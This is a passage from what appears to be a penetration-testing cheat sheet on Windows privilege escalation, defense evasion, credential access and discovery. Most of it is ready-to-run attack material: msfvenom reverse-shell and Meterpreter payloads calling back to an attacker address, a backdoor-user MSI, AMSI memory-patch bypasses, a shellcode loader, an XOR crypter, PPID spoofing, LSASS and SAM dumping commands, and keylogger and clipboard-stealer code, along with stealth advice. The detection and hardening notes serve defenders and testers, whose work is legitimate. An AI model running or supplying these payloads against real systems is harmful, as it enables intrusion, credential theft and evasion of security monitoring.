Windows\nwinpeas.exe quiet servicesinfo\n```\n\n#### What to Expect\nService starts your executable instead of the legitimate one when restarted. Requires service restart or reboot.\n\n#### Detection / Hardening\n*   Monitor for executables in unusual locations\n*   Service executable digital signature verification\n*   Regular service path auditing\n*   **EDR** detection of service path hijacking\n*   Quote all service paths in deployments\n\n#### Tools / References\n**PowerUp**, **WinPEAS**, **AccessChk**, **SC.exe**\n\n#### OPSEC / Notes\nUse filenames that look legitimate. Time execution with service restarts. Clean up after exploitation.\n\n### 4.5 DLL Hijacking\n\n#### What It Is / Why It Matters\nPlacing malicious DLLs where applications will load them instead of legitimate ones. Effective for privilege escalation when vulnerable applications run with higher privileges.\n\n#### Quick Steps / Commands\n\n**Find DLL hijacking opportunities:**\n\n```cmd\n# Process Monitor for DLL search order\nprocmon.exe /AcceptEula /Quiet /BackingFile log.pml\n# Filters: Result is NAME NOT FOUND, Path ends with .dll\n\n# Manual checking with listdlls\nlistdlls.exe -d example.dll\n```\n\n**Common hijack locations:**\n\n```cmd\n# Application directory (writable)\nC:\\Program Files\\VulnerableApp\\malicious.dll\n\n# Windows directories (if writable)\nC:\\Windows\\System32\\malicious.dll\nC:\\Windows\\SysWOW64\\malicious.dll\n\n# Current directory\n.\\malicious.dll\n```\n\n**Generate malicious DLL:**\n\n```bash\n# Meterpreter DLL\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.20 LPORT=443 -f dll > hijack.dll\n\n# Simple reverse shell DLL\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -f dll > hijack.dll\n```\n\n**DLL Proxying (maintain functionality):**\n\n```cpp\n// Forward exports while adding malicious code\n#pragma comment(linker, \"/export:RealFunction=hijack.RealFunction\")\n```\n\n**PowerShell discovery:**\n\n```powershell\n# Find missing DLLs\nGet-Process | ForEach-Object {\n    $_.Modules | Where-Object {$_.FileName -eq $null} | Select-Object ProcessName\n}\n\n# Check writable directories\nGet-ChildItem \"C:\\\" -Recurse -Directory | Get-Acl | Where-Object {$_.Access | Where-Object {$_.IdentityReference -eq \"BUILTIN\\Users\" -and $_.FileSystemRights -match \"Write\"}}\n```\n\n#### What to Expect\nMalicious DLL loads when the vulnerable application runs. Inherits the application's privileges. May cause application instability.\n\n#### Detection / Hardening\n*   DLL search order hardening\n*   Code signing verification\n*   Monitor DLL loads from unusual locations\n*   **EDR** detection of known hijack patterns\n*   Protected processes (**PPL**)\n\n#### Tools / References\n**Process Monitor**, DLL Export Viewer, **PowerSploit**, **Rattler**\n\n#### OPSEC / Notes\nTest thoroughly to avoid crashes. Use DLL proxying for stealth. Target applications that run with elevated privileges.\n\n### 4.6 Misconfigurations Exploitation\n\n#### What It Is / Why It Matters\nLeveraging system misconfigurations like weak service permissions, insecure registry keys, or `AlwaysInstallElevated` for privilege escalation.\n\n#### Quick Steps / Commands\n\n**Service permission checks:**\n\n```cmd\n# Check service permissions with accesschk\naccesschk.exe -uwcqv \"Authenticated Users\" * /accepteula\naccesschk.exe -uwcqv \"Everyone\" * /accepteula\n\n# Check specific service\nsc qc \"VulnerableService\"\naccesschk.exe -ucqv VulnerableService\n```\n\n**AlwaysInstallElevated:**\n\n```cmd\n# Check if AlwaysInstallElevated is enabled\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n# Create malicious MSI\nmsfvenom -p windows/adduser USER=backdoor PASS=Password123! -f msi > setup.msi\n\n# Install MSI with system privileges\nmsiexec /quiet /qn /i setup.msi\n```\n\n**Unattended install files:**\n\n```cmd\n# Find unattended installation files\ndir /s *unattend.xml\ndir /s *sysprep.inf\ndir /s *sysprep.xml\n\n# Check for credentials\ntype C:\\Windows\\Panther\\unattend.xml\nfindstr /S /I \"password\" *.xml *.ini *.txt\n```\n\n**PowerShell misconfiguration checks:**\n\n```powershell\n# PowerUp for comprehensive checks\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n\n# Check for password in files\nGet-ChildItem C:\\ -Include *.txt,*.xml,*.ini -Recurse -ErrorAction SilentlyContinue | Select-String \"password\"\n\n# Check registry for passwords\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>$null\n```\n\n**Scheduled task permissions:**\n\n```cmd\n# Check scheduled task permissions\nschtasks /query /fo LIST /v\naccesschk.exe -quv \"System\" /accepteula\n```\n\n#### What to Expect\nVarious privilege escalation paths depending on found misconfigurations. Often provides quick elevation without exploits.\n\n#### Detection / Hardening\n*   Regular security configuration audits\n*   Least privilege principle for services\n*   Disable `AlwaysInstallElevated`\n*   Clean up unattended installation files\n*   Monitor for configuration changes\n\n#### Tools / References\n**PowerUp**, **WinPEAS**, **AccessChk**, **Seatbelt**\n\n#### OPSEC / Notes\nUse built-in tools when possible. Avoid making unnecessary changes. Document found misconfigurations for reporting.\n\n## 5. 🎭 Defense Evasion\n\n### 5.1 AMSI Bypass\n\n#### What It Is / Why It Matters\nBypassing the Anti-Malware Scan Interface (**AMSI**) to execute malicious PowerShell scripts without detection. Critical for running offensive tools in modern Windows environments.\n\n#### Quick Steps / Commands\n\n**Common AMSI bypass strings:**\n\n```powershell\n# Basic AMSI bypass\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# Alternative method\n$Win32 = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\n\nAdd-Type $Win32\n$LoadLibrary = [Win32]::LoadLibrary(\"am\" + \"si.dll\")\n$Address = [Win32]::GetProcAddress($LoadLibrary, \"Amsi\" + \"Scan\" + \"Buffer\")\n$p = 0\n[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)\n$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)\n[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)\n```\n\n**Memory patch technique:**\n\n```powershell\n# Patch AMSI in memory\n$MethodDefinition = @'\npublic static void Patch() {\n    var lib = LoadLibrary(\"amsi.dll\");\n    var addr = GetProcAddress(lib, \"AmsiScanBuffer\");\n\n    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };\n    Marshal.Copy(patch, 0, addr, patch.Length);\n}\n'@\n\n$Type = Add-Type -MemberDefinition $MethodDefinition -Name \"AMSI\" -Namespace \"Bypass\" -PassThru\n$Type::Patch()\n```\n\n**Reflection-based bypass:**\n\n```powershell\n# Using reflection to disable AMSI\n$ReflectedAssembly = [System.Reflection.Assembly]::GetExecutingAssembly()\n$AmsiUtils = $ReflectedAssembly.GetType('System.Management.Automation.AmsiUtils')\n$AmsiUtils.GetField('amsiContext', 'NonPublic,Static').SetValue($null, [IntPtr]::Zero)\n```\n\n#### What to Expect\nAbility to run previously detected PowerShell scripts and tools. May still be detected by advanced **EDR** solutions.\n\n#### Detection / Hardening\n*   Monitor for **AMSI** bypass patterns\n*   **EDR** behavioral detection\n*   Constrained Language Mode\n*   PowerShell logging (ScriptBlock, Module)\n*   **AMSI** provider updates\n\n#### Tools / References\n**AMSI.fail**, **PowerSploit**, **Invoke-Obfuscation**\n\n#### OPSEC / Notes\nTest bypasses against target **EDR**. Use multiple techniques. Consider timing to avoid mass scanning.\n\n### 5.2 AV/EDR Evasion\n\n#### What It Is / Why It Matters\nTechniques to avoid detection by antivirus (**AV**) and endpoint detection and response (**EDR**) systems. Essential for maintaining access.\n\n#### Quick Steps / Commands\n\n**Payload obfuscation:**\n\n```bash\n# Veil-Evasion for AV evasion\nveil-evasion\n> use powershell/meterpreter/rev_http\n> set LHOST 10.10.14.20\n> generate\n\n# Shellter for dynamic payload injection\nshellter -a -f /usr/share/windows-binaries/plink.exe -p meterpreter_reverse_tcp\n```\n\n**Donut for in-memory execution:**\n\n```bash\n# Convert PE to shellcode\ndonut -a 2 -b 1 -o payload.bin malware.exe\n\n# Execute from memory\ndonut shellcode_loader.exe -p payload.bin\n```\n\n**Process hollowing:**\n\n```bash\n# Create suspended process and inject payload\n# Common targets: svchost.exe, notepad.exe\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.20 LPORT=443 -f raw > shellcode.bin\n```\n\n**Custom loaders:**\n\n```csharp\n// C# shellcode loader\nbyte[] shellcode = new byte[] { 0xfc, 0x48, 0x83... };\n\nvar memory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,\n    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\nMarshal.Copy(shellcode, 0, memory, shellcode.Length);\n\nvar thread = CreateThread(IntPtr.Zero, 0, memory, IntPtr.Zero, 0, IntPtr.Zero);\nWaitForSingleObject(thread, 0xFFFFFFFF);\n```\n\n#### What to Expect\nReduced detection rates for payloads. May require multiple iterations to achieve full evasion.\n\n#### Detection / Hardening\n*   Behavioral analysis\n*   Memory scanning\n*   Process integrity checks\n*   **EDR** telemetry correlation\n*   Machine learning detection\n\n#### Tools / References\n**Veil**, **Shellter**, **Donut**, **Cobalt Strike**, **Mythic**\n\n#### OPSEC / Notes\nTest against target **AV/EDR**. Use custom crypters. Avoid public payloads.\n\n### 5.3 Obfuscation\n\n#### What It Is / Why It Matters\nMaking code and commands difficult to analyze and detect through various transformation techniques.\n\n#### Quick Steps / Commands\n\n**PowerShell obfuscation:**\n\n```powershell\n# String reversal and encoding\n'whoami' | .( $eNv:CoMsPeC[4,15,25]-JoIN'')\n\n# Invoke-Obfuscation\nImport-Module Invoke-Obfuscation\nInvoke-Obfuscation -ScriptBlock { whoami } -Command 'Token\\All\\1' -Quiet\n\n# Base64 encoding\n$command = \"whoami\"\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encoded = [Convert]::ToBase64String($bytes)\npowershell -enc $encoded\n```\n\n**Binary obfuscation:**\n\n```bash\n# UPX packing\nupx -9 malware.exe\n\n# Hyperion encryption\nwine hyperion.exe -v malware.exe malware_encrypted.exe\n```\n\n**JavaScript obfuscation:**\n\n```javascript\n// Obfuscated JavaScript\nvar _0xa0e9=[\"\\x77\\x68\\x6F\\x61\\x6D\\x69\"];function _0xae84(){return _0xa0e9[0];}eval(_0xae84());\n\n// Using obfuscator.io\n// Online tool for JavaScript obfuscation\n```\n\n#### What to Expect\nReduced static detection rates. May impact performance. Some techniques are easily reversed.\n\n#### Detection / Hardening\n*   Deobfuscation engines\n*   Behavioral analysis\n*   Entropy analysis\n*   **AMSI** scanning\n*   **EDR** pattern recognition\n\n#### Tools / References\n**Invoke-Obfuscation**, **UPX**, **Hyperion**, **Obfuscator.io**\n\n#### OPSEC / Notes\nBalance obfuscation with functionality. Test against target security controls.\n\n### 5.4 Binary Packing/Stubbing\n\n#### What It Is / Why It Matters\nWrapping malicious binaries in encrypted layers to avoid signature detection while maintaining functionality.\n\n#### Quick Steps / Commands\n\n**Custom packers:**\n\n```bash\n# sRDI for converting DLLs to position-independent shellcode\npython ConvertToShellcode.py malware.dll\n\n# PE2SHC for PE to shellcode conversion\npython pe2shc.py malware.exe shellcode.c\n```\n\n**Crypter development:**\n\n```csharp\n// Simple XOR crypter in C#\nbyte[] key = { 0x01, 0x02, 0x03, 0x04 };\nbyte[] encrypted = new byte[payload.Length];\n\nfor (int i = 0; i < payload.Length; i++) {\n    encrypted[i] = (byte)(payload[i] ^ key[i % key.Length]);\n}\n\nFile.WriteAllBytes(\"encrypted.bin\", encrypted);\n```\n\n**Stub execution:**\n\n```csharp\n// Stub that decrypts and executes in memory\nbyte[] encrypted = File.ReadAllBytes(\"encrypted.bin\");\nbyte[] decrypted = new byte[encrypted.Length];\n\nfor (int i = 0; i < encrypted.Length; i++) {\n    decrypted[i] = (byte)(encrypted[i] ^ key[i % key.Length]);\n}\n\n// Execute decrypted payload in memory\n```\n\n#### What to Expect\nEvasion of signature-based detection. Potential performance overhead.\n\n#### Detection / Hardening\n*   Memory analysis\n*   Entropy detection\n*   Emulation/sandboxing\n*   Behavioral monitoring\n*   Packers detection\n\n#### Tools / References\n**sRDI**, **PE2SHC**, custom crypters, commercial packers\n\n#### OPSEC / Notes\nUse unique keys per target. Test stability thoroughly.\n\n### 5.5 Time-based Evasion\n\n#### What It Is / Why It Matters\nDelaying or timing malicious activity to avoid automated analysis and detection systems.\n\n#### Quick Steps / Commands\n\n**Sleep obfuscation:**\n\n```powershell\n# API-based sleep to avoid Sleep() hooking\nAdd-Type -TypeDefinition @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic static class Kernel32 {\n    [DllImport(\"kernel32.dll\")]\n    public static extern void Sleep(uint dwMilliseconds);\n\n    [DllImport(\"kernel32.dll\")]\n    public static extern IntPtr GetTickCount();\n}\n\"@\n\n# Use GetTickCount for timing\n$start = [Kernel32]::GetTickCount()\ndo {\n    [Kernel32]::Sleep(100)\n} while (([Kernel32]::GetTickCount() - $start) -lt 30000)\n```\n\n**Random delays:**\n\n```powershell\n# Random sleep intervals\n$sleepTime = Get-Random -Minimum 10000 -Maximum 30000\nStart-Sleep -Milliseconds $sleepTime\n\n# Jitter in C2 beacons\nbeacon> sleep 60000\nbeacon> jitter 25\n```\n\n**Sandbox detection:**\n\n```powershell\n# Check uptime (sandboxes often have low uptime)\n$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime\nif ($uptime.TotalMinutes -lt 30) { exit }\n\n# Check resources (sandboxes often have limited resources)\n$memory = Get-CimInstance Win32_ComputerSystem | Select-Object TotalPhysicalMemory\nif ($memory.TotalPhysicalMemory -lt 4GB) { exit }\n```\n\n#### What to Expect\nBypass of automated sandbox analysis. Delayed but more reliable execution.\n\n#### Detection / Hardening\n*   Long-term behavioral analysis\n*   Timing correlation\n*   Resource monitoring\n*   **EDR** persistence\n\n#### Tools / References\n**Cobalt Strike**, **Metasploit**, custom timing logic\n\n#### OPSEC / Notes\nBalance evasion with operational needs. Consider engagement timeline.\n\n### 5.6 Masquerading\n\n#### What It Is / Why It Matters\nDisguising malicious processes and files as legitimate system components to avoid suspicion.\n\n#### Quick Steps / Commands\n\n**Process name spoofing:**\n\n```cmd\n# Copy to system directory with legitimate name\ncopy malware.exe \"C:\\Windows\\System32\\svchost.exe -k netsvcs\"\n\n# Use explorer.exe as parent\nstart /B malware.exe\n```\n\n**Parent process spoofing:**\n\n```csharp\n// C# code for PPID spoofing\nvar parent = Process.GetProcessesByName(\"explorer\").First();\nvar processInfo = new PROCESS_INFORMATION();\nvar startupInfo = new STARTUPINFOEX();\n\nstartupInfo.StartupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFOEX));\nstartupInfo.lpAttributeList = IntPtr.Zero;\n\nInitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref size);\nstartupInfo.lpAttributeList = Marshal.AllocHGlobal(size);\nInitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref size);\n\nUpdateProcThreadAttribute(\n    startupInfo.lpAttributeList, 0,\n    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,\n    parent.Handle, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);\n\nCreateProcess(null, \"malware.exe\", IntPtr.Zero, IntPtr.Zero,\n    false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null,\n    ref startupInfo, out processInfo);\n```\n\n**File attribute manipulation:**\n\n```cmd\n# Set file attributes to hidden\nattrib +h +s malware.exe\n\n# Modify timestamps (timestomp)\ncopy /b malware.exe +,, C:\\Windows\\System32\\malware.exe\n```\n\n#### What to Expect\nReduced visibility in process lists and file explorers. May bypass basic security checks.\n\n#### Detection / Hardening\n*   Process ancestry analysis\n*   File integrity monitoring\n*   Digital signature verification\n*   **EDR** behavioral detection\n*   Parent-child process correlation\n\n#### Tools / References\n**Cobalt Strike**, **Metasploit**, custom spoofing tools\n\n#### OPSEC / Notes\nUse legitimate-looking names and paths. Test against target monitoring.\n\n## 6. 🔐 Credential Access\n\n### 6.1 Mimikatz / LaZagne / Rubeus\n\n#### What It Is / Why It Matters\nExtracting credentials from memory, tickets, and system stores for lateral movement and privilege escalation.\n\n#### Quick Steps / Commands\n\n**Mimikatz basics:**\n\n```bash\n# Dump LSASS memory\nprivilege::debug\nsekurlsa::logonpasswords\n\n# Dump SAM database\ntoken::elevate\nlsadump::sam\n\n# Extract LSA secrets\nlsadump::secrets\n\n# Pass-the-Hash\nsekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH_HERE\n```\n\n**Rubeus for Kerberos:**\n\n```bash\n# Harvest tickets every 30 seconds\nRubeus.exe harvest /interval:30\n\n# AS-REP Roasting\nRubeus.exe asreproast /format:hashcat /outfile:hashes.txt\n\n# Kerberoasting\nRubeus.exe kerberoast /outfile:kerberoast.txt\n\n# Pass-the-Ticket\nRubeus.exe ptt /ticket:base64_ticket\n```\n\n**LaZagne for application passwords:**\n\n```bash\n# Extract all saved passwords\nlaZagne.exe all\n\n# Browser passwords only\nlaZagne.exe browsers\n\n# Specific application\nlaZagne.exe wifi\n```\n\n#### What to Expect\nClear-text passwords, hashes, and tickets for various authentication methods.\n\n#### Detection / Hardening\n*   **Credential Guard**\n*   **LSASS** protection\n*   Kerberos auditing\n*   **AppLocker** restrictions\n*   **EDR** monitoring\n\n#### Tools / References\n**Mimikatz**, **Rubeus**, **LaZagne**, **Kekeo**\n\n#### OPSEC / Notes\nUse from memory when possible. Clean up artifacts. Consider engagement rules.\n\n### 6.2 LSASS Dump\n\n#### What It Is / Why It Matters\nExtracting the `LSASS` process memory to obtain credentials offline.\n\n#### Quick Steps / Commands\n\n**Procdump method:**\n\n```cmd\n# Dump LSASS with procdump\nprocdump.exe -ma lsass.exe lsass.dmp\n\n# Minidump with Task Manager\n# Right-click lsass.exe -> Create dump file\n```\n\n**PowerShell methods:**\n\n```powershell\n# PowerShell minidump\nGet-Process lsass | Export-Minidump -FilePath C:\\lsass.dmp\n\n# Using comsvcs.dll\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\lsass.dmp full\n```\n\n**Custom dumpers:**\n\n```csharp\n// C# code for LSASS dumping\nvar hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, lsassPid);\nvar hFile = CreateFile(\"lsass.dmp\", GENERIC_WRITE, 0, IntPtr.Zero, CREATE_ALWAYS, 0, IntPtr.Zero);\n\nMiniDumpWriteDump(hProcess, lsassPid, hFile, MINIDUMP_TYPE.MiniDumpWithFullMemory,\n    IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);\n```\n\n#### What to Expect\nMemory dump file containing credentials. Requires offline processing.\n\n#### Detection / Hardening\n*   **LSASS** protection (**PPL**)\n*   **Credential Guard**\n*   Dump file creation monitoring\n*   **EDR** memory protection\n*   Process access auditing\n\n#### Tools / References\n**Procdump**, `comsvcs.dll`, custom dumpers, **Mimikatz**\n\n#### OPSEC / Notes\nUse legitimate tools when possible. Clean up dump files. Process offline.\n\n### 6.3 SAM Extraction\n\n#### What It Is / Why It Matters\nObtaining the Security Account Manager (**SAM**) database containing local user password hashes.\n\n#### Quick Steps / Commands\n\n**Registry dump method:**\n\n```cmd\n# Save registry hives\nreg save hklm\\sam sam.save\nreg save hklm\\system system.save\nreg save hklm\\security security.save\n\n# Copy to attacker machine and extract with secretsdump.py\npython3 secretsdump.py -sam sam.save -system system.save LOCAL\n```\n\n**Volume Shadow Copy:**\n\n```cmd\n# Create shadow copy\nvssadmin create shadow /for=C:\n\n# Copy SAM from shadow copy\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\sam C:\\sam.save\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\system C:\\system.save\n\n# Delete shadow copy\nvssadmin delete shadows /for=C: /quiet\n```\n\n**In-memory extraction:**\n\n```bash\n# Use Mimikatz to read from memory\nprivilege::debug\ntoken::elevate\nlsadump::sam\n```\n\n#### What to Expect\nLM/NTLM hashes for local accounts. Can be cracked or used for Pass-the-Hash.\n\n#### Detection / Hardening\n*   Registry access monitoring\n*   **VSS** service auditing\n*   **LSA** protection\n*   **Credential Guard**\n*   **SAM** access restrictions\n\n#### Tools / References\n**reg.exe**, **vssadmin**, **Mimikatz**, **secretsdump.py**\n\n#### OPSEC / Notes\nRequires administrative privileges. Clean up extracted files.\n\n### 6.4 Credential Spraying / Brute Force\n\n#### What It Is / Why It Matters\nAttempting authentication with common or weak passwords across multiple accounts.\n\n#### Quick Steps / Commands\n\n**Domain password spray:**\n\n```powershell\n# PowerView password spray\nInvoke-DomainPasswordSpray -UserList users.txt -Password Spring2025! -Domain corp.local\n\n# With delay between attempts\nInvoke-DomainPasswordSpray -UserList users.txt -PasswordList passwords.txt -Domain corp.local -Delay 5\n```\n\n**SMB brute force:**\n\n```bash\n# CrackMapExec for SMB\ncrackmapexec smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success\n\n# Hydra for various services\nhydra -L users.txt -P passwords.txt 10.10.10.10 smb\nhydra -L users.txt -P passwords.txt 10.10.10.10 ssh\n```\n\n**Kerberos pre-auth brute force:**\n\n```bash\n# AS-REP Roasting with GetNPUsers\nGetNPUsers.py -no-pass -usersfile users.txt -dc-ip 10.10.10.2 corp.local/\n\n# With password spray\nGetNPUsers.py -usersfile users.txt -passwords passwords.txt -dc-ip 10.10.10.2 corp.local\n```\n\n#### What to Expect\nValid credentials for further access. Account lockouts possible.\n\n#### Detection / Hardening\n*   Account lockout policies\n*   Failed login monitoring\n*   Anomaly detection\n*   **MFA** implementation\n*   Strong password policies\n\n#### Tools / References\n**CrackMapExec**, **Hydra**, **Metasploit**, custom scripts\n\n#### OPSEC / Notes\nUse realistic timing. Monitor for lockouts. Know engagement rules.\n\n### 6.5 Keylogging\n\n#### What It Is / Why It Matters\nCapturing keyboard input to obtain passwords and other sensitive information.\n\n#### Quick Steps / Commands\n\n**PowerShell keylogger:**\n\n```powershell\n$signature = @'\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)]\npublic static extern short GetAsyncKeyState(int virtualKeyCode);\n'@\n\nAdd-Type -MemberDefinition $signature -Name Win32Utils -Namespace API\n\nwhile($true) {\n    Start-Sleep -Milliseconds 40\n    for($i=1; $i -le 254; $i++) {\n        $state = [API.Win32Utils]::GetAsyncKeyState($i)\n        if($state -eq -32767) {\n            $key = [System.Console]::Write([char]$i)\n            Add-Content -Path \"keylog.txt\" -Value $key\n        }\n    }\n}\n```\n\n**Metasploit keylogger:**\n\n```bash\n# Meterpreter keylogger\nkeyscan_start\nkeyscan_dump\nkeyscan_stop\n```\n\n**Custom keyloggers:**\n\n```csharp\n// C# keylogger with SetWindowsHookEx\nprivate static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {\n    if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {\n        int vkCode = Marshal.ReadInt32(lParam);\n        char key = (char)vkCode;\n        File.AppendAllText(\"log.txt\", key.ToString());\n    }\n    return CallNextHookEx(_hookID, nCode, wParam, lParam);\n}\n```\n\n#### What to Expect\nCaptured keystrokes including passwords, emails, and other sensitive data.\n\n#### Detection / Hardening\n*   **EDR** behavioral detection\n*   Keyboard hook monitoring\n*   Process monitoring\n*   Application control\n*   User training\n\n#### Tools / References\n**Metasploit**, custom keyloggers, PowerShell scripts\n\n#### OPSEC / Notes\nConsider legal implications. Use only in authorized engagements. Minimal impact on user experience.\n\n### 6.6 Clipboard Access\n\n#### What It Is / Why It Matters\nMonitoring clipboard content for copied passwords, cryptocurrency addresses, and other sensitive data.\n\n#### Quick Steps / Commands\n\n**PowerShell clipboard monitor:**\n\n```powershell\nAdd-Type -AssemblyName System.Windows.Forms\n\nwhile($true) {\n    if([System.Windows.Forms.Clipboard]::ContainsText()) {\n        $clipboardText = [System.Windows.Forms.Clipboard]::GetText()\n        if($clipboardText -match \"password|pwd|pass|key|secret\") {\n            Write-Output \"Clipboard captured: $clipboardText\"\n            Add-Content -Path \"clipboard.log\" -Value \"$(Get-Date): $clipboardText\"\n        }\n    }\n    Start-Sleep -Seconds 5\n}\n```\n\n**C# clipboard monitor:**\n\n```csharp\n// Continuous clipboard monitoring\n[STAThread]\nstatic void Main() {\n    Clipboard.Clear();\n    while(true) {\n        Thread.Sleep(1000);\n        if(Clipboard.ContainsText()) {\n            string text = Clipboard.GetText();\n            File.AppendAllText(\"clipboard.log\", $\"{DateTime.Now}: {text}\\n\");\n        }\n    }\n}\n```\n\n**Meterpreter clipboard:**\n\n```bash\n# Dump clipboard content\nmeterpreter > webcam_list\nmeterpreter > webcam_snap\n# Note: Metasploit doesn't have direct clipboard command\n```\n\n#### What to Expect\nCaptured clipboard content including passwords, keys, and other copied data.\n\n#### Detection / Hardening\n*   Clipboard access monitoring\n*   **EDR** detection\n*   Application control\n*   User awareness\n*   Encryption of sensitive clipboard data\n\n#### Tools / References\n**PowerShell**, C# applications, custom scripts\n\n#### OPSEC / Notes\nHigh privacy impact. Use only when explicitly authorized. Minimal logging of non-sensitive data.\n\n## 7. 🔎 Discovery\n\n### 7.1 AD Enumeration\n\n#### What It Is / Why It Matters\nGathering information about Active Directory structure, users, groups, and trust relationships for attack planning.\n\n#### Quick Steps / Commands\n\n**PowerView enumeration:**\n\n```powershell\n# Basic domain info\nGet-NetDomain\nGet-NetDomainController\n\n# User and group enumeration\nGet-NetUser | Select-Object samaccountname, description, lastlogon\nGet-NetGroup -GroupName \"Domain Admins\"\nGet-NetGroupMember -GroupName \"Domain Admins\"\n\n# Computer enumeration\nGet-NetComputer | Select-Object name, operatingsystem\n```\n\n**BloodHound data collection:**\n\n```bash\n# SharpHound collector\nSharpHound.exe --CollectionMethod All\nSharpHound.exe -c DCOnly\n\n# Ingest into BloodHound\n# Upload ZIP to BloodHound UI\n```\n\n**AD module commands:**\n\n```powershell\n# Active Directory module\nGet-ADUser -Filter * -Properties *\nGet-ADGroup -Filter * | Select-Object Name\nGet-ADComputer -Filter * -Properties OperatingSystem\n\n# Trust relationships\nGet-ADTrust -Filter *\n```\n\n#### What to Expect\nComprehensive AD structure understanding, privilege escalation paths, and lateral movement opportunities.\n\n#### Detection / Hardening\n*   AD auditing enabled\n*   Monitor LDAP queries\n*   **EDR** detection of enumeration tools\n*   Least privilege for service accounts\n*   Regular AD health checks\n\n#### Tools / References\n**PowerView**, **BloodHound**, AD Module, LDAP search\n\n#### OPSEC / Notes\nUse built-in tools when possible. Limit query volume. Understand normal AD traffic patterns.\n\n### 7.2 Network Scanning\n\n#### What It Is / Why It Matters\nIdentifying active hosts, open ports, and services for target selection and attack surface mapping.\n\n#### Quick Steps / Commands\n\n**Nmap scanning:**\n\n```bash\n# Basic TCP SYN scan\nnmap -sS -sV -sC 10.10.10.0/24\n\n# Full port scan\nnmap -p- --min-rate 5000 10.10.10.10\n\n# UDP scan (slower)\nnmap -sU -p 53,123,161 10.10.10.0/24\n\n# Vulnerability scanning\nnmap --script vuln 10.10.10.10\n```\n\n**Masscan for large networks:**\n\n```bash\n# Fast port scanning\nmasscan -p1-65535 10.10.10.0/24 --rate=1000\n\n# Specific ports\nmasscan -p80,443,22,3389 10.10.10.0/24 --rate=10000\n```\n\n**PowerShell port scanning:**\n\n```powershell\n# Simple port scanner\n1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"10.10.10.10\",$_)) \"Port $_ is open\"} 2>$null\n\n# Advanced scanner\nfunction Test-Port($hostname, $port) {\n    $test = New-Object System.Net.Sockets.TcpClient\n    try {\n        $test.Connect($hostname, $port)\n        $test.Close()\n        return $true\n    } catch {\n        return $false\n    }\n}\n```\n\n#### What to Expect\nNetwork topology mapping, service discovery, and potential attack vectors identification.\n\n#### Detection / Hardening\n*   Network **IDS/IPS**\n*   Firewall logging\n*   **EDR** network monitoring\n*   Port knocking\n*   Service hardening\n\n#### Tools / References\n**Nmap**, **Masscan**, **PowerShell**, **Netcat**\n\n#### OPSEC / Notes\nUse slow scan rates when stealth is required. Consider timing and source IP.\n\n### 7.3 User/Group Listing\n\n#### What It Is / Why It Matters\nIdentifying users, groups, and their relationships for privilege escalation and lateral movement planning.\n\n#### Quick Steps / Commands\n\n**Local user/group enumeration:**\n\n```cmd\n# Local users and groups\nnet users\nnet localgroup administrators\nnet localgroup \"Remote Desktop Users\"\n\n# PowerShell equivalents\nGet-LocalUser | Select-Object Name,Enabled,LastLogon\nGet-LocalGroupMember -Group \"Administrators\"\n```\n\n**Domain user/group enumeration:**\n\n```cmd\n# Domain users and groups\nnet user /domain\nnet group \"Domain Admins\" /domain\nnet group \"Enterprise Admins\" /domain\n\n# Whoami information\nwhoami /all\nwhoami /groups\n```\n\n**PowerShell AD enumeration:**\n\n```powershell\n# Current user info\n$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()\n$currentUser.Groups | Format-Table\n\n# Domain users with last logon\nGet-ADUser -Filter * -Properties LastLogonDate |\n    Select-Object Name,SamAccountName,LastLogonDate |\n    Sort-Object LastLogonDate -Descending\n```\n\n#### What to Expect\nUser accounts, group memberships, privilege information, and potential targets.\n\n#### Detection / Hardening\n*   AD query auditing\n*   **EDR** monitoring\n*   Least privilege principle\n*   Regular group membership reviews\n*   Account 